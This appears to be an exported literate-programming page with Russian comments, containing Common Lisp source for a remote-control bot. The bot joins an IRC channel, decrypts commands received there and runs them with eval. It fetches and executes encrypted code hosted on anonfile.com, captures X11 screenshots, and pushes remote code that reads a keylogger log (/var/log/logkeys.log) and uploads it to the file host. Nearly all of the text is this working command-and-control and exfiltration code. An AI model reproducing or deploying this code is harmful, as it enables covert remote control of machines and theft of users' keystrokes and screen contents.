  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-download-link (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings
              "(https://cdn-([0-9]*)\.anonfile.com\/(.*))\\\""
              str)
           (when match-p (return (aref result 0))))))

(defun anon-file-download (filename)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request (format nil "https://anonfile.com~A" filename)
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (link (get-download-link text)))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request link
             :user-agent *user-agent*
             :cookie-jar cookie-jar
             :additional-headers *additional-headers*
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))
</pre>
</div>
</div>
</div>

<div id="outline-container-orge0bed2b" class="outline-3">
<h3 id="orge0bed2b">Unpack image</h3>
<div class="outline-text-3" id="text-orge0bed2b">
<div class="org-src-container">
<pre class="src src-lisp" id="org0d315fb">(defun unpack-img (image)
  (declare (optimize (speed 3) (safety 0)))
  (let* ((dims (array-dimensions image))
         (height (car dims))
         (width (cadr dims))
         (new-width (ash width 3))
         (result (make-array (list height new-width)
                             :element-type '(unsigned-byte 8))))
    (declare (type fixnum width)
             (type fixnum new-width)
             (type fixnum height))
    (do ((qy 0 (incf qy)))
        ((= qy height))
      (declare (type fixnum qy))
      (do ((qx 0 (incf qx)))
          ((= qx width))
        (declare (type fixnum qx))
        (let ((acc (aref image qy qx)))
          (declare (type (unsigned-byte 8) acc))
          ;; (format t "~8,'0B" acc)
          (do ((out 0 (incf out))
               (in  7 (decf in)))
              ((= 8 out))
            (declare (type fixnum out in))
            (unless (= 0 (logand acc (ash 1 in)))
              (setf (aref result qy (logior (ash qx 3) out))
                    255)))))
      ;; (format t "~%")
      )
    result))

;; TEST
;; (print
;;  (unpack-img
;;   (pack-img
;;    (x-snapshot :width 31 :height 23))))

;; TEST
;; (time
;;  (let* ((image  (load-png "FILE1088"))
;;         (unpack (unpack-img image))
;;         (dims (array-dimensions unpack)))
;;    (save-png (cadr dims)
;;              (car dims)
;;              (format nil "~A" (gensym "FILE"))
;;              unpack
;;              :grayscale)))
</pre>
</div>
</div>
</div>

<div id="outline-container-org7e395b5" class="outline-3">
<h3 id="org7e395b5">Hi Rule</h3>
<div class="outline-text-3" id="text-org7e395b5">
<p>
Правило "ответить на приветствие" совпадает с приветственным
сообщением. Чтобы оно было чуть сложнее чем просто посылка сообщения, мы
можем попытаться загрузить какой-нибудь файл с удаленного узла
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org9c0ebec">(defun hi-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^hi$" str))

;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; encrypt
(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

;; anon_file_upload
;; (setf drakma:*header-stream* *standard-output*)

(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-csrf (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
           (when match-p (return (aref result 0))))))

(defun get-cookies-alist (cookie-jar)
  "Получаем alist с печеньками из cookie-jar"
  (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
       (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

(defun anon-file-upload (filename content)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request "https://anonfile.com/"
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (csrf (get-csrf text))
             (boundary "---------------------------196955623314664815241571979859")
             (type-header (format nil "multipart/form-data; boundary=~A" boundary))
             (new-headers `(("Accept" . "application/json")
                            ("Accept-Language" . "en-US,en;q=0.5")
                            ("Cache-Control" . "no-cache")
                            ("X-Requested-With" . "XMLHttpRequest")
                            ("X-CSRF-Token" . ,csrf)
                            ("Origin" . "https://anonfile.com")
                            ("Referer" . "https://anonfile.com/")
                            ("Content-Type" . ,type-header)
                            ("TE" . "Trailers"))))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request
             "https://api.anonfile.com/upload"
             :user-agent *user-agent*
             :method :post
             :form-data t
             :content (format nil "--~A
Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
Content-Type: application/octet-stream

~A
--~A--" boundary filename content boundary)
             :cookie-jar cookie-jar
             :additional-headers new-headers
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; upload_code
(defun upload-code (code key)
  (let* ((oct (flex:string-to-octets code :external-format :utf-8))
         (base64 (encrypt oct key))
         (filename (format nil "u-~A" (get-universal-time)))
         (result   (cl-json:decode-json-from-string
                    (anon-file-upload filename base64)))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    link))

;; TEST for upload
;; (upload-code "(defun alfa () (print 1))" 1234567890)
;; /t1TaCeD1ne/u-3784605289

;; encode
(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))

(defun upload-code-and-send (code key seed)
  (let* ((code-link (upload-code code key))
         (cmd (format nil "(update \"~A\" ~A)" code-link key))
         (enc (encode cmd seed)))
    (sendmsg enc)))

;; (upload-code-and-send "(alfa)" 1234567890 3784753813)

(defun hi-rule-consequent (str src)
  (dbg ":: HI-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890)
         (receiver (parse-integer (subseq src 1)))
         (code (format
                nil
                "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
                tmpkey)))
    (upload-code-and-send code tmpkey receiver)))

;; (let* ((tmpkey 1234567890)
;;        (src "b3785294860")
;;        (receiver (parse-integer (subseq src 1)))
;;        (code (format
;;               nil
;;               "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
;;               tmpkey)))
;;   (upload-code-and-send code tmpkey receiver))
</pre>
</div>
</div>
</div>

<div id="outline-container-org52dff29" class="outline-3">
<h3 id="org52dff29">K Rule</h3>
<div class="outline-text-3" id="text-org52dff29">
<div class="org-src-container">
<pre class="src src-lisp" id="org35bb300">(defun k-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^k/(.*)/u-(.*)$" str))

(defun download-and-decrypt (link key)
  (flex:octets-to-string
   (decrypt
    (anon-file-download link)
    key)
   :external-format :utf-8))

;; (upload-code
;;  (alexandria:read-file-into-string "q.lisp\"")

;; (download-and-decrypt "/some/link" *tmpkey*)

(defun k-rule-consequent (str src)
  (dbg ":: K-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890))
    (alexandria:write-string-into-file
     (download-and-decrypt (subseq str 1) tmpkey)
     (format nil "~~/wnt/~A.log" (ppcre:regex-replace-all "/" str "_")))))
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-org7ed8183" class="outline-2">
<h2 id="org7ed8183">Utils</h2>
<div class="outline-text-2" id="text-org7ed8183">
<div class="org-src-container">
<pre class="src src-lisp" id="org6896448">(defparameter *outlock* (bt:make-recursive-lock "output-lock"))

(defmacro bprint (var)
  `(subseq (with-output-to-string (*standard-output*)
             (pprint ,var)) 1))

(defmacro dbg (msg &amp;rest params)
  "debug output with lock"
  `(bt:with-recursive-lock-held (*outlock*)
     (format t ,msg ,@params)
     (finish-output)))

(defun decode-time (universal-time)
  (multiple-value-bind (second minute hour date month year day daylight-p zone)
      (decode-universal-time universal-time)
    (format nil "~A-~A-~A ~A:~A:~A" year month date hour minute second)))
</pre>
</div>
</div>
</div>

<div id="outline-container-org9ea2493" class="outline-2">
<h2 id="org9ea2493">Old</h2>
<div class="outline-text-2" id="text-org9ea2493">
<div class="org-src-container">
<pre class="src src-lisp" id="orgf3a9abd">&lt;&lt;anon_file_upload&gt;&gt;
&lt;&lt;unpack_img&gt;&gt;

(defun save-png (width height pathname-str image
                 &amp;optional (color-type :truecolor-alpha))
  (let* ((png (make-instance 'zpng:png :width width :height height
                             :color-type color-type))
         (vector (make-array ;; displaced vector - need copy for save
                  (* height width (zpng:samples-per-pixel png))
                  :displaced-to image :element-type '(unsigned-byte 8))))
    ;; Тут применен потенциально опасный трюк, когда мы создаем
    ;; объект PNG без данных, а потом добавляем в него данные,
    ;; используя неэкспортируемый writer.
    ;; Это нужно чтобы получить третью размерность массива,
    ;; который мы хотим передать как данные и при этом
    ;; избежать создания для этого временного объекта
    (setf (zpng::%image-data png) (copy-seq vector))
    (zpng:write-png png pathname-str)))

</pre>
</div>
</div>

<div id="outline-container-org86c5bd2" class="outline-3">
<h3 id="org86c5bd2">Save and Load</h3>
<div class="outline-text-3" id="text-org86c5bd2">
<p>
Для целей отладки нам нужно уметь сохранять и загружать png-изображения
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org5f8eb9f">;; DEPRECATED, use explicit saving png-sequence by with-open-file
;; (defun save-png (pathname-str png)
;;   (zpng:write-png png pathname-str))

(defun load-png (pathname-str)
  "Возвращает массив size-X столбцов по size-Y точек,
     где столбцы идут слева-направо, а точки в них - сверху-вниз
     ----
     В zpng есть указание на возможные варианты COLOR:
     ----
           (defmethod samples-per-pixel (png)
             (ecase (color-type png)
               (:grayscale 1)
               (:truecolor 3)
               (:indexed-color 1) ;; НЕ ПОДДЕРЖИВАЕТСЯ
               (:grayscale-alpha 2)
               (:truecolor-alpha 4)))
    "
  (let* ((png (png-read:read-png-file pathname-str))
         (image-data (png-read:image-data png))
         (color (png-read:colour-type png))
         (dims (cond ((or (equal color :truecolor-alpha)
                          (equal color :truecolor))
                      (list (array-dimension image-data 1)
                            (array-dimension image-data 0)
                            (array-dimension image-data 2)))
                     ((or (equal color :grayscale)
                          (equal color :greyscale))
                      (list (array-dimension image-data 1)
                            (array-dimension image-data 0)))
                     (t (error 'unk-png-color-type :color color))))
         (result ;; меняем размерности X и Y местами
          (make-array dims :element-type '(unsigned-byte 8))))
    ;; (dbg "~% new-arr ~A "(array-dimensions result))
    ;; ширина, высота, цвет =&gt; высота, ширина, цвет
    (macrolet ((cycle (&amp;body body)
                 `(do ((y 0 (incf y)))
                      ((= y (array-dimension result 0)))
                    (do ((x 0 (incf x)))
                        ((= x (array-dimension result 1)))
                      ,@body))))
      (cond ((or (equal color :truecolor-alpha)
                 (equal color :truecolor))
             (cycle (do ((z 0 (incf z)))
                        ((= z (array-dimension result 2)))
                      (setf (aref result y x z)
                            (aref image-data x y z)))))
            ((or (equal color :grayscale)
                 (equal color :greyscale))
             (cycle (setf (aref result y x)
                          (aref image-data x y))))
            (t (error 'unk-png-color-type :color color)))
      result)))
</pre>
</div>
</div>
</div>

<div id="outline-container-orgd42f36d" class="outline-3">
<h3 id="orgd42f36d">Bit-vector operations</h3>
<div class="outline-text-3" id="text-orgd42f36d">
<p>
Для целей отладки определим операции кодирования в битовый вектор и
обратно
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org63d0e2d">(defun bit-vector-&gt;integer (bit-vector)
  "Create a positive integer from a bit-vector."
  (reduce #'(lambda (first-bit second-bit)
              (+ (* first-bit 2) second-bit))
          bit-vector))

(defun integer-&gt;bit-vector (integer)
  "Create a bit-vector from a positive integer."
  (labels ((integer-&gt;bit-list (int &amp;optional accum)
             (cond ((&gt; int 0)
                    (multiple-value-bind (i r) (truncate int 2)
                      (integer-&gt;bit-list i (push r accum))))
                   ((null accum) (push 0 accum))
                   (t accum))))
    (coerce (integer-&gt;bit-list integer) 'bit-vector)))
</pre>
</div>
</div>
</div>

<div id="outline-container-org40841fd" class="outline-3">
<h3 id="org40841fd">Binarization</h3>
<div class="outline-text-3" id="text-org40841fd">
<p>
Получение черно-белого изображения или в градациях серого из
полноцветного.
</p>

<p>
Здесь остается пространство для оптимизаций путем применения
SIMD-операций.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org37ef1d8">(defun binarization (image &amp;optional threshold)
  (let* ((dims (array-dimensions image))
         (new-dims (cond ((equal 3 (length dims))  (butlast dims))
                         ((equal 2 (length dims))  dims)
                         (t (error 'binarization-error))))
         (result (make-array new-dims :element-type '(unsigned-byte 8))))
    (macrolet ((cycle (&amp;body body)
                 `(do ((y 0 (incf y)))
                      ((= y (array-dimension image 0)))
                    (do ((x 0 (incf x)))
                        ((= x (array-dimension image 1)))
                      ,@body))))
      (cond ((equal 3 (length dims))
             (cycle (do ((z 0 (incf z)))
                        ((= z (array-dimension image 2)))
                      (let ((avg (floor (+ (aref image y x 0)
                                           (aref image y x 1)
                                           (aref image y x 2))
                                        3)))
                        (when threshold
                          (if (&lt; threshold avg)
                              (setf avg 255)
                              (setf avg 0)))
                        (setf (aref result y x) avg)))))
            ((equal 2 (length dims))
             (cycle (let ((avg (aref image y x)))
                      (when threshold
                        (if (&lt; threshold avg)
                            (setf avg 255)
                            (setf avg 0)))
                      (setf (aref result y x) avg))))
            (t (error 'binarization-error))))
    result))

;; TEST: binarize and save screenshot
;; (let* ((to   "x-snapshot-binarize.png")
;;        (image-data (binarization (x-snapshot) 127))) ;; NEW: threshold!
;;   (destructuring-bind (height width) ;; NB: no depth!
;;       (array-dimensions image-data)
;;     (save-png width height to image-data :grayscale))) ;; NB: grayscale!


;; TEST: binarize get png and save
;; (print
;;  (let* ((image-data (binarization (x-snapshot) 127))) ;; NEW: threshold!
;;    (destructuring-bind (height width) ;; NB: no depth!
;;        (array-dimensions image-data)
;;      (let ((seq (get-png width height image-data :grayscale)))
;;        (with-open-file (file-stream "tee.png"
;;                                     :direction :output
;;                                     :if-exists :supersede
;;                                     :if-does-not-exist :create
;;                                     :element-type '(unsigned-byte 8))
;;          (write-sequence seq file-stream))))))
</pre>
</div>
</div>
</div>

<div id="outline-container-orgce08fe9" class="outline-3">
<h3 id="orgce08fe9">Bit-image</h3>
<div class="outline-text-3" id="text-orgce08fe9">
<p>
Упаковка бинаризованного черно-белого изображения в битовый массив
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org9aae654">(defun make-bit-image (image-data)
  (destructuring-bind (height width &amp;optional colors)
      (array-dimensions image-data)
    ;; функция может работать только с бинарными изобажениями
    (assert (null colors))
    (let* ((new-width (+ (logior width 7) 1))
           (bit-array (make-array (list height new-width)
                                  :element-type 'bit
                                  :initial-element 1)))
      (do ((qy 0 (incf qy)))
          ((= qy height))
        (do ((qx 0 (incf qx)))
            ((= qx width))
          ;; если цвет пикселя не белый, считаем,
          ;; что это не фон и заносим в битовый массив 1
          (if (equal (aref image-data qy qx) 255)
              (setf (bit bit-array qy qx) 1)
              (setf (bit bit-array qy qx) 0))))
      bit-array)))

;; TEST: make-bit-image
;; (print
;;  (make-bit-image
;;   (binarization (x-snapshot :x 0 :y 0 :width 30 :height 30) 127)))
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-org153306f" class="outline-2">
<h2 id="org153306f">Assembly</h2>
<div class="outline-text-2" id="text-org153306f">
<div class="org-src-container">
<pre class="src src-lisp" id="org890fdda">(ql:quickload "anaphora")
(use-package :anaphora)
(ql:quickload "bordeaux-threads")
(ql:quickload "clx")
(ql:quickload "zpng")
(ql:quickload "png-read")
(ql:quickload "drakma")
(ql:quickload "cl-ppcre")
(ql:quickload "cl-base64")
(ql:quickload "prbs")
(ql:quickload "cl-irc")
(ql:quickload "cl-json")
(ql:quickload "ironclad")

(defparameter *outlock* (bt:make-recursive-lock "output-lock"))

(defmacro bprint (var)
  `(subseq (with-output-to-string (*standard-output*)
             (pprint ,var)) 1))

(defmacro dbg (msg &amp;rest params)
  "debug output with lock"
  `(bt:with-recursive-lock-held (*outlock*)
     (format t ,msg ,@params)
     (finish-output)))

(defun decode-time (universal-time)
  (multiple-value-bind (second minute hour date month year day daylight-p zone)
      (decode-universal-time universal-time)
    (format nil "~A-~A-~A ~A:~A:~A" year month date hour minute second)))

(defparameter *max-diffs-cnt* 4)

(defparameter *sleep-interval* 3)

(defparameter *watchdog-timer* 0)

(defparameter *watchdog-timer-max* 100)

(defparameter *supervisor-stop-flag* nil)

(defparameter *irc-th-stop-flag* nil)

(defparameter *shot-th-stop-flag* nil)

(defparameter *connection-established-flag* nil)

(defparameter *shot-threads* nil)

(defparameter *max-shot-thread-life-time* 5)

(defparameter *max-shot-thread-cnt* 5)

(defparameter *thread-operations-lock*
  (bt:make-recursive-lock "thread-operations-lock"))

;; irc
(defparameter *irc-sess* nil) ;; (get-universal-time)
(defparameter *irc-user* nil) ;; (format nil "b~A" *irc-sess*)
(defparameter *irc-serv* "irc.freenode.org")
(defparameter *irc-chan* "#wntriscoming")
(defparameter *irc-lock* (bt:make-recursive-lock "irc-lock"))
(defparameter *irc-conn* nil)

(defmacro sendmsg (msg &amp;rest params)
  `(bt:with-recursive-lock-held (*irc-lock*)
     (handler-case
         (cl-irc:privmsg *irc-conn* *irc-chan* (format nil ,msg ,@params))
       (t (err)
         (dbg "::irc connect error: ~A~%" (type-of err))
         nil))))

;; irc-hook
;; irc_cmd_proc
;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; ecrypt
(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

;; decrypt
(defun decrypt (base64 seed)
  (let* ((oct (base64:base64-string-to-usb8-array base64))
         (gen (prbs:byte-gen 31 :seed seed))
         (len (length oct))
         (gam (funcall gen len)))
    (seq-xor len oct gam)))

;; encode
(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))

;; decode
(defun decode (cmd seed)
  (multiple-value-bind (match-p result)
      (ppcre:scan-to-strings "s/([0-f]*)/(.*)$" cmd)
    (unless match-p
      (return-from decode nil))
    (destructuring-bind (crc32 cmd)
        (coerce result 'list)
      (let* ((oct (decrypt cmd seed))
             (crc (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct))))
        (if (equal crc crc32)
            (flex:octets-to-string oct :external-format :utf-8)
            ;; else
            nil)))))

(defparameter *irc-cmd*
  (lambda (param)
    (block irc-cmd-block
      (let* ((msg (cadr (CL-IRC:ARGUMENTS param)))
             (cmd (decode msg *irc-sess*)))
        (dbg "::MSG: [~A]~%" msg)
        (dbg "::CMD: [~A]~%" cmd)
        (finish-output)
        (unless (null cmd)
          (setf *watchdog-timer* 0)
          (let ((result (handler-case (bprint (eval (read-from-string cmd)))
                          (t (err)
                            (dbg "::irc-cmd error: ~A~%" (type-of err))
                            (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
                            (return-from irc-cmd-block nil)))))
            (setf *watchdog-timer* 0)
            (sendmsg "=&gt; ~A" result)
            (dbg "::=&gt; ~A~%" result)
            (finish-output)))))))

;; example of send encoded cmd
;; (encode "(print 1)" *irc-sess*)

;; example of wrong encoded cmd
;; (encode "(print 1)" (get-universal-time))

(defun irc-msg-hook (param)
  "MUST return T for stop hooks processing"
  (funcall *irc-cmd* param)
  (setf *watchdog-timer* 0)
  t)

(defun irc-helper ()
  (sleep 1)
  (cl-irc:add-hook *irc-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'irc-msg-hook)
  (sleep 1)
  (bt:with-recursive-lock-held (*irc-lock*)
    (cl-irc:join *irc-conn* *irc-chan*))
  (sleep 1)
  (bt:with-recursive-lock-held (*irc-lock*)
    (setf *connection-established-flag* t))
  (sendmsg "hi"))

(defun irc-loop ()
  (bt:make-thread
   #'irc-helper :name "irc-helper-th"
   :initial-bindings
   `((*standard-output* . ,*standard-output*)
     (*irc-sess* . ,*irc-sess*)
     (*irc-user* . ,*irc-user*)
     (*irc-serv* . ,*irc-serv*)
     (*irc-chan* . ,*irc-chan*)
     (*irc-lock* . ,*irc-lock*)
     (*irc-conn* . ,*irc-conn*)))
  (handler-case (cl-irc:read-message-loop *irc-conn*)
    (SB-INT:SIMPLE-STREAM-ERROR (err)
      (dbg "::irc-loop error: ~A~%" (type-of err)))
    ;; (t (err)
    ;;   (dbg "::irc-loop error: ~A~%" (type-of err)))
    ))

(defun irc ()
  "irc thread func"
  (setf *irc-sess* (get-universal-time))
  (setf *irc-user* (format nil "b~A" *irc-sess*))
  (setf *irc-conn*
        (handler-case
            (cl-irc:connect :nickname *irc-user* :server *irc-serv*)
          (USOCKET:NS-TRY-AGAIN-CONDITION (err)
            (dbg "::irc connect error: ~A~%" (type-of err))
            nil)
          (t (err)
            (dbg "::irc connect error: ~A~%" (type-of err))
            nil)))
  (when *irc-conn*
    (dbg "::irc conn:~A~%" *irc-conn*)
    (setf *watchdog-timer* 0)
    (irc-loop)))

;; update
;; anon_file_download
(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-download-link (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings
              "(https://cdn-([0-9]*)\.anonfile.com\/(.*))\\\""
              str)
           (when match-p (return (aref result 0))))))

(defun anon-file-download (filename)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request (format nil "https://anonfile.com~A" filename)
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (link (get-download-link text)))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request link
             :user-agent *user-agent*
             :cookie-jar cookie-jar
             :additional-headers *additional-headers*
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

(defun update (link key)
  (let* ((base64 (anon-file-download link))
         (oct    (decrypt base64 key))
         (cmd    (flex:octets-to-string oct :external-format :utf-8))
         (result (handler-case (bprint (eval (read-from-string cmd)))
                   (t (err)
                     (dbg "::irc-cmd error: ~A~%" (type-of err))
                     (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
                     (return-from update nil)))))
    result))

;; (update "/3444C7Dbna/u-3784602724" 1234567890)

;; shot
;; x_snapshot
(defmacro with-display (host (display screen root-window) &amp;body body)
  `(let* ((,display (xlib:open-display ,host))
          (,screen (first (xlib:display-roots ,display)))
          (,root-window (xlib:screen-root ,screen)))
     (unwind-protect (progn ,@body)
       (xlib:close-display ,display))))

(defmacro with-default-display ((display &amp;key (force nil)) &amp;body body)
  `(let ((,display (xlib:open-default-display)))
     (unwind-protect
          (unwind-protect
               ,@body
            (when ,force
              (xlib:display-force-output ,display)))
       (xlib:close-display ,display))))

(defmacro with-default-display-force ((display) &amp;body body)
  `(with-default-display (,display :force t) ,@body))

(defmacro with-default-screen ((screen) &amp;body body)
  (let ((display (gensym)))
    `(with-default-display (,display)
       (let ((,screen (xlib:display-default-screen ,display)))
         ,@body))))

(defmacro with-default-window ((window) &amp;body body)
  (let ((screen (gensym)))
    `(with-default-screen (,screen)
       (let ((,window (xlib:screen-root ,screen)))
         ,@body))))

(defun x-size ()
  (with-default-screen (s)
    (values
     (xlib:screen-width s)
     (xlib:screen-height s))))

(defparameter *default-x* 0)
(defparameter *default-y* 0)
(defparameter *default-width* 800)
(defparameter *default-height* 600)

(defun init-defaults ()
  (multiple-value-bind (width height)
      (x-size)
    (setf *default-width* width
          *default-height* height
          *default-x* 0
          *default-y* 0)))

(init-defaults)

(defun raw-image-&gt;png (data width height)
  (let* ((png (make-instance 'zpng:png :width width :height height
                             :color-type :truecolor-alpha
                             :image-data data))
         (data (zpng:data-array png)))
    (dotimes (y height)
      (dotimes (x width)
        ;; BGR -&gt; RGB, ref code: https://goo.gl/slubfW
        ;; diffs between RGB and BGR: https://goo.gl/si1Ft5
        (rotatef (aref data y x 0) (aref data y x 2))
        (setf (aref data y x 3) 255)))
    png))

(defun x-snapshot (&amp;key (x *default-x*) (y *default-y*)
                     (width  *default-width*) (height *default-height*)
                     path)
  ;; "Return RGB data array (The dimensions correspond to the height, width,
  ;; and pixel components, see comments in x-snapsearch for more details),
  ;; or write to file (PNG only), depend on if you provide the path keyword"
  (with-default-window (w)
    (let ((image
           (raw-image-&gt;png
            (xlib:get-raw-image w :x x :y y
                                :width width :height height
                                :format :z-pixmap)
            width height)
          ))
      (if path
          (let* ((ext (pathname-type path))
                 (path
                  (if ext
                      path
                      (concatenate 'string path ".png")))
                 (png? (or (null ext) (equal ext "png"))))
            (cond
              (png? (zpng:write-png image path))
              (t (error "Only PNG file is supported"))))
          (zpng:data-array image)))))

;; (x-snapshot :path "x-snapshot-true-color.png")

;; pack_image
(defun pack-img (image)
  (declare (optimize (speed 3) (safety 0)))
  (let* ((dims (array-dimensions image))
         (height (car dims))
         (width (cadr dims))
         (new-width (ash (logand (+ width 7) (lognot 7)) -3))
         (need-finisher (not (equal new-width (ash width -3))))
         (result (make-array (list height new-width)
                             :element-type '(unsigned-byte 8)))
         (bp 8)
         (acc 0))
    (declare (type (unsigned-byte 8) acc)
             (type fixnum bp)
             (type fixnum width)
             (type fixnum new-width)
             (type fixnum height))
    (macrolet ((byte-finisher (acc qy qx bp)
                 `(progn
                    ;; (format t "~8,'0B(~2,'0X)" ,acc ,acc)
                    (setf (aref result ,qy (ash ,qx -3)) ,acc)
                    (setf ,acc 0)
                    (setf ,bp 8))))
      (do ((qy 0 (incf qy)))
          ((= qy height))
        (declare (type fixnum qy))
        (do ((qx 0 (incf qx)))
            ((= qx width) (when need-finisher
                            (byte-finisher acc qy qx bp)))
          (declare (type fixnum qx))
          (let* ((avg (floor (+ (aref image qy qx 0)
                                (aref image qy qx 1)
                                (aref image qy qx 2))
                             3))
                 (pnt (ash avg -7)))
            (declare (type fixnum avg))
            (declare (type fixnum pnt))
            (decf bp)
            (setf acc (logior acc (ash pnt bp)))
            (when (= bp 0)
              (byte-finisher acc qy qx bp))))
        ;; (format t "~%")
        ))
    result))

;; (disassemble 'pack-img)

;; TEST: pack-img
;; (time
;;  (let* ((image (pack-img (x-snapshot)))
;;         (dims (array-dimensions image)))
;;    (save-png (cadr dims)
;;              (car dims)
;;              (format nil "~A" (gensym "FILE"))
;;              image
;;              :grayscale)))

;; wrap_img
;; get_png_obj
(defun get-png-obj (width height image &amp;optional (color-type :truecolor-alpha))
  (let* ((png (make-instance 'zpng:png :width width :height height
                             :color-type color-type))
         (vector (make-array ;; displaced vector - need copy for save
                  (* height width (zpng:samples-per-pixel png))
                  :displaced-to image :element-type '(unsigned-byte 8))))
    ;; Тут применен потенциально опасный трюк, когда мы создаем
    ;; объект PNG без данных, а потом добавляем в него данные,
    ;; используя неэкспортируемый writer.
    ;; Это нужно чтобы получить третью размерность массива,
    ;; который мы хотим передать как данные и при этом
    ;; избежать создания для этого временного объекта
    (setf (zpng::%image-data png) (copy-seq vector))
    png))

;; get_png_seq
(defun get-png-seq (png)
  (flex:with-output-to-sequence (stream)
    (zpng:write-png-stream png stream)))

;; anon_file_upload
;; (setf drakma:*header-stream* *standard-output*)

